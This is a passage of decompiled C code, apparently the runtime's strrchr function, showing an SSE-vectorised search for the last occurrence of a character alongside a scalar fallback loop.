                                                          CONCAT111(-(pcVar5[0x1b] == '\0'),
                                                                    CONCAT110(-(pcVar5[0x1a] == '\0'
                                                                               ),CONCAT19(-(pcVar5[
                                                  0x19] == '\0'),
                                                  CONCAT18(-(pcVar5[0x18] == '\0'),
                                                           CONCAT17(-(pcVar5[0x17] == '\0'),
                                                                    CONCAT16(-(pcVar5[0x16] == '\0')
                                                                             ,CONCAT15(-(pcVar5[0x15
                                                  ] == '\0'),
                                                  CONCAT14(-(pcVar5[0x14] == '\0'),
                                                           CONCAT13(-(pcVar5[0x13] == '\0'),
                                                                    CONCAT12(-(pcVar5[0x12] == '\0')
                                                                             ,CONCAT11(-(pcVar5[0x11
                                                  ] == '\0'),-(pcVar5[0x10] == '\0'))))))))))))))));
        pcVar5 = pcVar5 + 0x10;
        uVar1 = (uint)(ushort)((ushort)(SUB161(auVar12 >> 7,0) & 1) |
                               (ushort)(SUB161(auVar12 >> 0xf,0) & 1) << 1 |
                               (ushort)(SUB161(auVar12 >> 0x17,0) & 1) << 2 |
                               (ushort)(SUB161(auVar12 >> 0x1f,0) & 1) << 3 |
                               (ushort)(SUB161(auVar12 >> 0x27,0) & 1) << 4 |
                               (ushort)(SUB161(auVar12 >> 0x2f,0) & 1) << 5 |
                               (ushort)(SUB161(auVar12 >> 0x37,0) & 1) << 6 |
                               (ushort)(SUB161(auVar12 >> 0x3f,0) & 1) << 7 |
                               (ushort)(SUB161(auVar12 >> 0x47,0) & 1) << 8 |
                               (ushort)(SUB161(auVar12 >> 0x4f,0) & 1) << 9 |
                               (ushort)(SUB161(auVar12 >> 0x57,0) & 1) << 10 |
                               (ushort)(SUB161(auVar12 >> 0x5f,0) & 1) << 0xb |
                               (ushort)(SUB161(auVar12 >> 0x67,0) & 1) << 0xc |
                               (ushort)(SUB161(auVar12 >> 0x6f,0) & 1) << 0xd |
                               (ushort)(SUB161(auVar12 >> 0x77,0) & 1) << 0xe |
                              (ushort)((byte)-(*pcVar6 == '\0') >> 7) << 0xf);
      }
      iVar4 = 0;
      if (uVar1 != 0) {
        for (; (uVar1 >> iVar4 & 1) == 0; iVar4 = iVar4 + 1) {
        }
      }
      pauVar2 = (undefined (*) [16])(pcVar5 + iVar4);
    }
    else {
      pauVar2 = (undefined (*) [16])0x0;
      uVar3 = (uint)_Str & 0xf;
      while (uVar3 != 0) {
        if ((byte)*_Str == uVar1) {
          pauVar2 = (undefined (*) [16])_Str;
        }
        if ((byte)*_Str == 0) {
          return (char *)pauVar2;
        }
        _Str = _Str + 1;
        uVar3 = (uint)_Str & 0xf;
      }
      do {
        pauVar7 = (undefined (*) [16])((int)_Str + 0x10);
        iVar4 = pcmpistri(ZEXT416(uVar1),*(undefined (*) [16])_Str,0x40);
        if ((undefined (*) [16])0xffffffef < _Str) {
          pauVar2 = (undefined (*) [16])(_Str + iVar4);
        }
        _Str = (char *)pauVar7;
      } while (pauVar7 != (undefined (*) [16])0x0);
    }
    return (char *)pauVar2;
  }
  iVar4 = -1;
  do {
    pcVar5 = _Str;
    if (iVar4 == 0) break;
    iVar4 = iVar4 + -1;
    pcVar5 = _Str + 1;
    cVar13 = *_Str;
    _Str = pcVar5;
  } while (cVar13 != '\0');
  iVar4 = -(iVar4 + 1);
  pcVar5 = pcVar5 + -1;
  do {
    pcVar6 = pcVar5;
    if (iVar4 == 0) break;
    iVar4 = iVar4 + -1;
    pcVar6 = pcVar5 + -1;
    cVar13 = *pcVar5;
    pcVar5 = pcVar6;
  } while ((char)_Ch != cVar13);
  pcVar6 = pcVar6 + 1;
  if (*pcVar6 != (char)_Ch) {
    pcVar6 = (char *)0x0;
  }
  return pcVar6;
}


